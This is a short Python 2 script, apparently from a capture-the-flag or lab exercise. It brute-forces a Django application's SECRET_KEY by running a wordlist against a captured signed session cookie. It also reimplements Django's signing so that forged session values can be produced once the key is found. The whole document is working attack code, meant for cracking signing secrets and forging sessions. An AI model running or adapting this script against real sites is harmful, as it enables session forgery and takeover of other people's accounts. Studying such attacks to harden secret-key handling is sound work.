from django.contrib.sessions.backends.db import SessionStore
from django.conf import settings
from django.core import signing
from django.core.signing import *
import sys 
import time

#python ~/../mysite/manage.py shell
#execfile('brute.py')

# Signing algorithm, equivalent to signing.dumps()
common_salt="django.core.signing"
def sign(obj):
    global common_salt
    data = b64_encode(JSONSerializer().dumps(obj))
    value = force_str(data)
    value = str('%s%s%s') % (value, ':', baseconv.base62.encode(int(time.time())))
    value = force_str(value)
    value = str('%s%s%s') % (value, ':', force_str(base64_hmac(common_salt + 'signer', value, settings.SECRET_KEY)))
    return value

# Unsigning algorithm
def unsign(data):
    global common_salt
    data = force_str(data)
    value, sig = data.rsplit(':', 1)
    if constant_time_compare(sig, force_str(base64_hmac(common_salt + 'signer', value, settings.SECRET_KEY))):
        result = force_text(value)
    else:
        return ''
    # Check timestamp, blah,blah
    value, timestamp = result.rsplit(':', 1)
    value = force_bytes(value)
    data = b64_decode(value)
    return JSONSerializer().loads(data)

sessionid = "eyJ1c2VyIjoiODA1MTMxIn0:1Yki06:uXJInrBIb9wBuD2fvTYbvndibKg"
for key in open('/home/chesley/Dropbox/tmp/web-d/dictionary.txt').readlines():
    settings.SECRET_KEY = key.strip()
    print "'%s'" % (settings.SECRET_KEY)
    a = unsign(sessionid)
    if a != '':
        print "Possible secret key: " + key.strip()
        with open('/home/chesley/Dropbox/tmp/web-d/brute.out', 'a') as f:
            f.write(key.strip())
            sys.exit(0)


